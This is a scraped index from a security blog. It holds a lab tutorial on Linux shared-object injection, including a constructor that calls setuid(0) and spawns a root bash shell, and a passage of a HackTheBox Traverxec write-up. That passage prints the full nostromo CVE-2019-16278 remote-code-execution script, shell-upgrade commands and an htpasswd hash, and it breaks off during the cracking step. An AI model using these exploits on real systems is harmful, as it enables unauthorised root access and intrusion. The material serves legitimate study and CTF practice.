low@ubuntu:~/so-files$ ldd ./myexec linux-vdso.so.1 (0x00007ffcb9571000) libcustom.so =\u003e /lib/libcustom.so (0x00007f74a1d09000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f74a1b17000) /lib64/ld-linux-x86-64.so.2 (0x00007f74a1d24000) Looking at this directories we can see a symbolic link from /lib to usr/lib: low@ubuntu:~/so-files$ ls -la /lib lrwxrwxrwx 1 root root 7 Nov 25 07:43 /lib -\u003e usr/lib low@ubuntu:~/so-files$ ls -la /lib/libcustom.so -rwxr-xr-x 1 root root 16200 Dec 10 12:15 /lib/libcustom.so low@ubuntu:~/so-files$ ls -la /usr/lib/libcustom.so -rwxr-xr-x 1 root root 16200 Dec 10 12:15 /usr/lib/libcustom.so We can also confirm the magic bytes with the program file: low@ubuntu:~/so-files$ file libcustom.c libcustom.c: C source, ASCII ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:0:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Method #1: Write permissions in /lib -\u003e /usr/lib Let’s navigate to where the malicious library is located: low@ubuntu:~/so-files$ cd ~/so-files/evil low@ubuntu:~/so-files/evil$ Startup by adding write permissions to the folder /usr/lib, this is a misconfiguration that should never be done: low@ubuntu:~/so-files/evil$ sudo chmod o+w /usr/lib/libcustom.so Replace the original library file with the malicious library file: low@ubuntu:~/so-files/evil$ cp libcustom.so /lib/libcustom.so Using ldd we can see that the library libcustom.so is pointing to the file that we just replaced: low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007fff77137000) libcustom.so =\u003e /lib/libcustom.so (0x00007fdca1371000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdca117f000) /lib64/ld-linux-x86-64.so.2 (0x00007fdca138c000) If we execute the binary, it will load the malicious library: low@ubuntu:~/so-files/evil$ /usr/bin/myexec Message from myexec.c! I'm the bad library! I'm trying to spawn a root shell... Check your shell! root@ubuntu:~/so-files/evil# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low) root@ubuntu:~/so-files/evil# whoami root root@ubuntu:~/so-files/evil# As we can see, we’re able to escalate privileges. Exit out of the root shell: root@ubuntu:~/so-files/evil# exit Now let’s restore the original library: low@ubuntu:~/so-files/evil$ sudo cp ~/so-files/libcustom.so /lib/libcustom.so Lastly, remove the write permissions from other users and groups: low@ubuntu:~/so-files/evil$ sudo chmod o-w /lib/libcustom.so ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:1:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Method #2: LD_PRELOAD (PATCHED) This will ONLY work if the binary does NOT have an SUID bit set. Let’s execute the binary that does NOT have an SUID bit set, in this case myexec2 that we created earlier: low@ubuntu:~/so-files/evil$ LD_PRELOAD=/home/low/so-files/evil/libcustom.so /usr/bin/myexec2 Message from myexec.c! I'm the bad library! I'm trying to spawn a root shell... Check your shell! low@ubuntu:~/so-files/evil$ As we can see above, it loads the malicious library but it then notices that there’s an SUID bit declaration in the malicious library and therefore it doesn’t execute root shell. Now let’s try the executing a binary with the SUID bit set: low@ubuntu:~/so-files/evil$ LD_PRELOAD=/home/low/so-files/evil/libcustom.so /usr/bin/myexec Message from myexec.c! Message from libcustom.c low@ubuntu:~/so-files/evil$ It doesn’t even load the malicious library because the binary itself (myexec) has an SUID bit set. This doesn’t work because it has been patched. Now let’s remove the value in the LD_PRELOAD environment variable with the unset command: low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD /home/low/so-files/evil/libcustom.so low@ubuntu:~/so-files/evil$ unset LD_PRELOAD low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD low@ubuntu:~/so-files/evil$ ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:2:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Method #3: LD_LIBRARY_PATH (PATCHED) Let’s modify the value of the LD_LIBRARY_PATH environment variable by adding the directory in which the malicious library is located: low@ubuntu:~/so-files/evil$ export LD_LIBRARY_PATH=/home/low/so-files/evil/ low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH /home/low/so-files/evil/ low@ubuntu:~/so-files/evil$ Using ldd we can see that library libcustom.so is now pointing to the directory that has the malicious library: low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffffe3f3000) libcustom.so =\u003e /home/low/so-files/evil/libcustom.so (0x00007fe052992000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe052791000) /lib64/ld-linux-x86-64.so.2 (0x00007fe05299e000) low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec2 linux-vdso.so.1 (0x00007ffde8bb2000) libcustom.so =\u003e /home/low/so-files/evil/libcustom.so (0x00007f7c0f2b0000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7c0f0af000) /lib64/ld-linux-x86-64.so.2 (0x00007f7c0f2bc000) low@ubuntu:~/so-files/evil$ If we try to do the same things as we did with the environment variable LD_PRELOAD, we can see that the same thing happens: low@ubuntu:~/so-files/evil$ /usr/bin/myexec Message from myexec.c! Message from libcustom.c low@ubuntu:~/so-files/evil$ /usr/bin/myexec2 Message from myexec.c! I'm the bad library! I'm trying to spawn a root shell... Check your shell! low@ubuntu:~/so-files/evil$ This doesn’t work because it has been patched as well. Now let’s remove the value in the LD_LIBRARY_PATH environment variable with the unset command: low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH /home/low/so-files/evil/ low@ubuntu:~/so-files/evil$ unset LD_LIBRARY_PATH low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH low@ubuntu:~/so-files/evil$ ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:3:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Method #4: /etc/ldconfig.so.conf Before continuing make sure that the environments variables that we used before are cleared: low@ubuntu:~/so-files/evil$ echo $LD_LIBRARY_PATH low@ubuntu:~/so-files/evil$ echo $LD_PRELOAD low@ubuntu:~/so-files/evil$ The file /etc/ld.so.conf is a configuration file pointing to other configuration files that will help the linker to locate libraries. Read the directories listed in the ldconfig configuration file /etc/ld.so.conf: low@ubuntu:~/so-files/evil$ ls -la /etc/ld.so.conf -rw-r--r-- 1 root root 34 Apr 14 2020 /etc/ld.so.conf low@ubuntu:~/so-files/evil$ cat /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf low@ubuntu:~/so-files/evil$ If we list the configuration files that are located in /etc/ld.so.conf.d/ we can see a few: low@ubuntu:~/so-files/evil$ ls -la /etc/ld.so.conf.d/ total 24 drwxr-xr-x 2 root root 4096 Aug 19 06:30 . drwxr-xr-x 128 root root 12288 Dec 10 12:04 .. -rw-r--r-- 1 root root 44 Apr 14 2020 libc.conf -rw-r--r-- 1 root root 100 Apr 14 2020 x86_64-linux-gnu.conf Create custom configuration file which points to the /tmp directory, which is a directory that low privileged users have write permissions on: low@ubuntu:~/so-files/evil$ sudo vim /etc/ld.so.conf.d/shouldnt_be_here.conf low@ubuntu:~/so-files/evil$ cat /etc/ld.so.conf.d/shouldnt_be_here.conf /tmp Since we have write permissions in the /tmp directory, we can place or write our malicious shared object there: low@ubuntu:~/so-files/evil$ cp libcustom.so /tmp low@ubuntu:~/so-files/evil$ ls -l /tmp/libcustom.so -rwxrwxr-x 1 low low 16360 Dec 10 12:38 /tmp/libcustom.so low@ubuntu:~/so-files/evil$ We now need to use ldconfig to update the linker’s cache so that it will be aware of this new evil library. The cache can be updated with the ldconfig command. ldd output BEFORE executing ldconfig: low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffc00ff9000) libcustom.so =\u003e /lib/libcustom.so (0x00007f7b7e24d000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7b7e05b000) /lib64/ld-linux-x86-64.so.2 (0x00007f7b7e268000) low@ubuntu:~/so-files/evil$ ldd output AFTER executing ldconfig: low@ubuntu:~/so-files/evil$ sudo /usr/sbin/ldconfig low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007fff9b6cd000) libcustom.so =\u003e /tmp/libcustom.so (0x00007f63a510f000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f63a4f1d000) /lib64/ld-linux-x86-64.so.2 (0x00007f63a512a000) low@ubuntu:~/so-files/evil$ Now we execute the binary: low@ubuntu:~/so-files/evil$ /usr/bin/myexec Message from myexec.c! I'm the bad library! I'm trying to spawn a root shell... Check your shell! root@ubuntu:~/so-files/evil# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low) root@ubuntu:~/so-files/evil# whoami root root@ubuntu:~/so-files/evil# We can see that we have escalated privileges. Exit out of the root shell: root@ubuntu:~/so-files/evil# exit Now remove the configuration file: low@ubuntu:~/so-files/evil$ sudo rm /etc/ld.so.conf.d/shouldnt_be_here.conf Now reload the ld configuration with ldconfig: low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffd4cd08000) libcustom.so =\u003e /tmp/libcustom.so (0x00007f150e0a7000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f150deb5000) /lib64/ld-linux-x86-64.so.2 (0x00007f150e0c2000) low@ubuntu:~/so-files/evil$ sudo ldconfig low@ubuntu:~/so-files/evil$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffeaefb4000) libcustom.so =\u003e /lib/libcustom.so (0x00007f35cf80a000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f35cf618000) /lib64/ld-linux-x86-64.so.2 (0x00007f35cf825000) low@ubuntu:~/so-files/evil$ ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:4:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Alternative ld.so.conf We create our fake ld.so.conf: low@ubuntu:~/so-files/evil$ cd /tmp low@ubuntu:/tmp$ echo \"include /tmp/conf/*\" \u003e /tmp/fake.ld.so.conf Then, we add a configuration file to the location indicated by fake.ld.so.conf: low@ubuntu:/tmp$ mkdir conf low@ubuntu:/tmp$ echo \"/tmp\" \u003e conf/evil.conf Finally, we execute ldconfig with the -f option: low@ubuntu:/tmp$ sudo ldconfig -f fake.ld.so.conf Now verify that the shared object that is being loaded is the malicious one and execute the binary (myexec): low@ubuntu:/tmp$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffd872a4000) libcustom.so =\u003e /tmp/libcustom.so (0x00007f9a11ce3000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9a11af1000) /lib64/ld-linux-x86-64.so.2 (0x00007f9a11cfe000) low@ubuntu:/tmp$ /usr/bin/myexec Message from myexec.c! I'm the bad library! I'm trying to spawn a root shell... Check your shell! root@ubuntu:/tmp# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low) root@ubuntu:/tmp# whoami root root@ubuntu:/tmp# We are able to escalate privileges, let’s exit out of the root shell: root@ubuntu:/tmp# exit Now remove everything: low@ubuntu:/tmp$ rm libcustom.so low@ubuntu:/tmp$ rm fake.ld.so.conf low@ubuntu:/tmp$ sudo rm -rf conf Review that the shared object is loading the correct one: low@ubuntu:/tmp$ ldd /usr/bin/myexec linux-vdso.so.1 (0x00007ffd07df0000) libcustom.so =\u003e /lib/libcustom.so (0x00007fdf67edb000) libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdf67ce9000) /lib64/ld-linux-x86-64.so.2 (0x00007fdf67ef6000) ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:4:1","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":["Linux Privilege Escalation"],"content":"Method #5: Missing Shared Object Let’s navigate to the directory where our .so files are located: low@ubuntu:/tmp$ cd ~/so-files Create a file named nosuchfile.c which it will open a shared object file: low@ubuntu:~/so-files$ vim nosuchfile.c Add the following code which basically prints the ‘Hello’ string on the screen and opens a dynamic library, in this case a shared object file named custom.so: #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cdlfcn.h\u003e int main(){ printf(\"Hello\\n\"); dlopen(\"/home/low/.config/custom.so\",1); // Load the custom.so shared object. return 0; } To compile you have to link against libdl, in order to do this add the -ldl option: low@ubuntu:~/so-files$ gcc -o nosuchfile nosuchfile.c -ldl Now copy this file to the /usr/bin/ directory: low@ubuntu:~/so-files$ sudo cp nosuchfile /usr/bin/ Then add the SUID bit to the /usr/bin/nosuchfile binary: low@ubuntu:~/.config$ sudo chmod u+s /usr/bin/nosuchfile Check if the file is not found: low@ubuntu:~/so-files$ strace /usr/bin/nosuchfile 2\u003e\u00261 | grep -iE \"open|access|no such file\" access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libdl.so.2\", O_RDONLY|O_CLOEXEC) = 3 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 openat(AT_FDCWD, \"/home/low/.config/custom.so\", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) Create a custom shared object in the directory that the binary (nosuchfile) looks for the dynamic library, in this case is /home/low/.config/custom.so. vim /home/low/.config/custom.c Will create a code that executes bash as root: #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e static void inject() __attribute__((constructor)); void inject() { setuid(0); setgid(0); system(\"/bin/bash\"); } Navigate to the directory /home/low/.config: low@ubuntu:~/so-files$ cd /home/low/.config Now compile the custom.c file and ignore the warning message: Treat warnings as errors (-Werror), as a developer you should always try to use this: low@ubuntu:~/.config$ gcc -c -Wall -Werror -fpic custom.c custom.c: In function ‘inject’: custom.c:7:2: error: implicit declaration of function ‘setuid’ [-Werror=implicit-function-declaration] 7 | setuid(0); | ^~~~~~ custom.c:8:2: error: implicit declaration of function ‘setgid’ [-Werror=implicit-function-declaration] 8 | setgid(0); | ^~~~~~ cc1: all warnings being treated as errors However, because I want to demonstrate this privilege escalation technique, I’ll ignore the warnings and just compile the program so I won’t use it: low@ubuntu:~/.config$ gcc -c -Wall -fpic custom.c custom.c: In function ‘inject’: custom.c:7:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] 7 | setuid(0); | ^~~~~~ custom.c:8:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration] 8 | setgid(0); | ^~~~~~ Create the shared object: low@ubuntu:~/.config$ gcc -shared -o custom.so custom.o Execute the program and since program has a SUID bit set, it executes as root, then it loads the evil library, and the evil library spawns a root shell: /usr/bin/nosuchfile As you can see we’re able to escalate to the root user: low@ubuntu:~/.config$ /usr/bin/nosuchfile Hello root@ubuntu:~/.config# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),1000(low) Now remove the SUID bit and try to execute the binary again: low@ubuntu:~/.config$ sudo chmod u-s /usr/bin/nosuchfile low@ubuntu:~/.config$ /usr/bin/nosuchfile Hello low@ubuntu:~/.config$ For this to work, the binary must have the SUID bit set. ","date":"2021-12-11","objectID":"/linux-privesc-so-injection/:5:0","tags":["youtube","privilege escalation","shared object injection"],"title":"Linux Privilege Escalation - Shared Object Injection","uri":"/linux-privesc-so-injection/"},{"categories":null,"content":"whoami My name is Yadiel Reyes, I go by the alias of wixnic. I’m a passionate self-motivated learner who likes to create content on IT Security related topics. In this blog you will find the content listed below: CTFs Programming Post-Exploitation AV Evasion Reverse Engineering Exploit Development Cracking Game Hacking Education: Bachelor’s Degree in Information Technology, Networks and Security (GPA 4.0) Certifications: CompTIA Linux+ CompTIA Network+ Certifcations that I’m preparing for: OSCP OSEP Public Resources These are my own resources that I have made for the public: HackNotes Donate Do you like my content? Well a donation is highly appreciated (is not obligatory) but it helps me. ","date":"2021-12-08","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Donate with cryptocurrency If you want to donate with crypto, I have these options: Monero: Ethereum: Bitcoin: Dogecoin: ","date":"2021-12-08","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Donate with cash If you want to donate with cash: PayPal: Buy Me a Coffee: ","date":"2021-12-08","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":["HackTheBox Nix"],"content":"This is my description.","date":"2021-10-22","objectID":"/htb_traverxec/","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Setup As always, we need to have a comfortable space to work with so I’ll create my working directories with the mk function that I have defined in my Z shell: ❯ which mk mk () { mkdir {scans,content,loot,exploits,scripts,report} } ❯ mk ❯ ls  content  exploits  loot  report  scans  scripts Recon ","date":"2021-10-22","objectID":"/htb_traverxec/:0:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"OS Identification Let’s start by identifying the operating system of the target: ❯ which os os () { ttl=\"$(ping -c 1 $1 | awk -F 'ttl=' '{print $2}' | cut -d ' ' -f 1 | tr -d '\\n')\" if (( $ttl \u003c= 64 )) then echo 'OS: Unix/Linux' elif (( $ttl \u003c= 128 )) then echo 'OS: Windows' else echo 'OS: Not detected' fi } ❯ os 10.10.10.165 OS: Unix/Linux As we can see the target operating system is Linux. ","date":"2021-10-22","objectID":"/htb_traverxec/:1:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"nmap nmap reveals that the ports SSH (TCP 22) and HTTP (TCP 80) are open ❯ sudo nmap -p- -n -Pn --min-rate 5000 -oG scans/nmap-tcpall 10.10.10.165 [sudo] password for wixnic: Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:11 AST Nmap scan report for 10.10.10.165 Host is up (0.094s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds ❯ which xp xp () { ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\" echo \"[+] Open ports: $ports\" \u003e\u003e xp.tmp printf $ports | xclip -sel clip echo \"[+] Ports copied to clipboard\" \u003e\u003e xp.tmp /usr/bin/bat xp.tmp rm xp.tmp } ❯ xp scans/nmap-tcpall ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: xp.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ [+] Open ports: 22,80 2 │ [+] Ports copied to clipboard ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ sudo nmap -p22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.165 Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-17 18:12 AST Nmap scan report for 10.10.10.165 Host is up (0.10s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68💿41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC |_http-server-header: nostromo 1.9.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds The OpenSSH version reveals that the target distribution is most likely to be Debian and the web service is nostromo 1.9.6. ","date":"2021-10-22","objectID":"/htb_traverxec/:2:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Website - HTTP TCP 80 We can see the nostromo 1.9.6 web service from the Server HTTP header: ❯ curl -I 10.10.10.165 HTTP/1.1 200 OK Date: Sun, 17 Oct 2021 22:19:35 GMT Server: nostromo 1.9.6 Connection: close Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT Content-Length: 15674 Content-Type: text/html Note: -I = Fetch the headers only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document ","date":"2021-10-22","objectID":"/htb_traverxec/:3:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Shell as www-data ","date":"2021-10-22","objectID":"/htb_traverxec/:4:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Vulnerability Research I’ll use searchsploit to find exploits while using the name of the HTTP service which is nostromo, searchsploit shows three potential Nostromo vulnerabilities: ❯ searchsploit nostromo ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nostromo - Directory Traversal Remote Command Execution (Metasploit) | multiple/remote/47573.rb nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution | linux/remote/35466.sh ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ❯ searchsploit -m multiple/remote/47837.py Exploit: nostromo 1.9.6 - Remote Code Execution URL: https://www.exploit-db.com/exploits/47837 Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py File Type: Python script, ASCII text executable Copied to: /home/wixnic/htb/traverxec/47837.py There’s a metasploit one, then a python script, and a shell script. The shell script is an exploit for an older version so we’ll ignore that one. Let’s start with the python exploit first. Python Code: # Exploit Title: nostromo 1.9.6 - Remote Code Execution # Date: 2019-12-31 # Exploit Author: Kr0ff # Vendor Homepage: # Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz # Version: 1.9.6 # Tested on: Debian # CVE : CVE-2019-16278 # This line needs to commented or removed #cve2019_16278.py #!/usr/bin/env python import sys import socket art = \"\"\" _____-2019-16278 _____ _______ ______ _____\\ \\ _____\\ \\_\\ | | | / / | | / /| || / / /|/ / /___/| / / /____/||\\ \\ \\ |/| |__ |___|/ | | |____|/ \\ \\ \\ | | | \\ | | _____ \\| \\| | | __/ __ |\\ \\|\\ \\ |\\ /| |\\ \\ / \\ | \\_____\\| | | \\_______/ | | \\____\\/ | | | /____/| \\ | | / | | |____/| \\|_____| || \\|_____|/ \\|____| | | |____|/ |___|/ \"\"\" help_menu = '\\r\\nUsage: cve2019-16278.py \u003cTarget_IP\u003e \u003cTarget_Port\u003e \u003cCommand\u003e' def connect(soc): # Defines an empty response response = \"\" try: while True: # Define 1024 bytes as the amount of bytes received by the socket. # Note: For best match with hardware and network realities, the value of bufsize should be a relatively small power of 2, for example, 4096. In this case is 2^10=1024, connection = soc.recv(1024) # If there's no connection then break (finish) if len(connection) == 0: break # If there is a connection, add it to the response variable response += connection # If it fails to receive a connection then pass (continue) except: pass # Return the response return response def cve(target, port, cmd): # Defines a socket soc = socket.socket() # Connects to the target IP and PORT soc.connect((target, int(port))) # Defines the payload payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n{}2\u003e\u00261'.format(cmd) # Sends the payload to the target IP and PORT soc.send(payload) # Receive a connection receive = connect(soc) # Print the receive value print(receive) if __name__ == \"__main__\": # Print the banner art print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] # Try to execute this 3 arguments (Example:10.10.10.165 80 id) cve(target, port, cmd) # If an index error happens, like not specifying the IP then it prints the help menu except IndexError: print(help_menu) Comment the line 10: ❯ sed '10q;d' 47837.py #cve2019_16278.py NUMq will quit immediately when the line number is NUM. d will delete the line instead of printing it; this is inhibited on the last line because the q causes the rest of the script to be skipped when quitting. We can su","date":"2021-10-22","objectID":"/htb_traverxec/:4:1","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Fully Interactive Shell We can enable a full TTY/PTY shell with the following commands In a reverse shell initiate a bash shell (choose one of the following, the idea is to spawn a bash shell): script /dev/null -c bash python -c 'import pty; pty.spawn(\"/bin/bash\")' echo os.system('/bin/bash') /bin/bash -i perl —e 'exec \"/bin/bash\";' Hit Ctrl+Z to get out of the shell and leave it running in the background, then in your console set TTY. stty raw -echo; fg Reset the reverse shell with: reset Define the terminal type, xterm works 99% of the time: \u003e Terminal Type? xterm Enable clear screen and movement with xtermand enable bash: export TERM=xterm export SHELL=bash In another console from your host get the rows and columns of the terminal: stty -a In the reverse shell set the rows and columns this will fix the margins of your terminal: stty rows \u003cnum\u003e columns \u003ccols\u003e Now confirm that you’re in TTY shell with: tty Privilege Escalaton: www-data –\u003e david ","date":"2021-10-22","objectID":"/htb_traverxec/:5:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"linPEAS Download linPEAS from github: ❯ wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh Setup an HTTP listener: ❯ sudo python3 -m http.server 80 After some looking around, I decided to upload and run linPEAS: www-data@traverxec:/dev/shm$ wget 10.10.16.6/linpeas.sh --2021-10-17 18:33:29-- http://10.10.16.6/linpeas.sh Connecting to 10.10.16.6:80... connected. HTTP request sent, awaiting response... 200 OK Length: 477235 (466K) [text/x-sh] Saving to: 'linpeas.sh' 0K .......... .......... .......... .......... .......... 10% 160K 3s 50K .......... .......... .......... .......... .......... 21% 518K 2s 100K .......... .......... .......... .......... .......... 32% 298K 1s 150K .......... .......... .......... .......... .......... 42% 422K 1s 200K .......... .......... .......... .......... .......... 53% 346K 1s 250K .......... .......... .......... .......... .......... 64% 422K 1s 300K .......... .......... .......... .......... .......... 75% 328K 0s 350K .......... .......... .......... .......... .......... 85% 318K 0s 400K .......... .......... .......... .......... .......... 96% 330K 0s 450K .......... ...... 100% 7.59M=1.4s 2021-10-17 18:33:30 (328 KB/s) - 'linpeas.sh' saved [477235/477235] www-data@traverxec:/dev/shm$ chmod +x linpeas.sh www-data@traverxec:/dev/shm$ ./linpeas.sh ","date":"2021-10-22","objectID":"/htb_traverxec/:6:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":".htpasswd One of the things that it found out was a .htpasswd file: ╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ ","date":"2021-10-22","objectID":"/htb_traverxec/:7:0","tags":["youtube","nostromo","searchsploit","htaccess","htpasswd","linpeas","hashcat","john","ssh-private-keys","gtfobins","journalctl","wget","curl","python"],"title":"HackTheBox - Traverxec","uri":"/htb_traverxec/"},{"categories":["HackTheBox Nix"],"content":"Crack .htpasswd We need to find the the module that we will need to use for hashcat for recognize the hash, based on the output we can see that the hash type is md5crypt and its mode number is 500: ❯ cat hash.txt ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: hash.txt 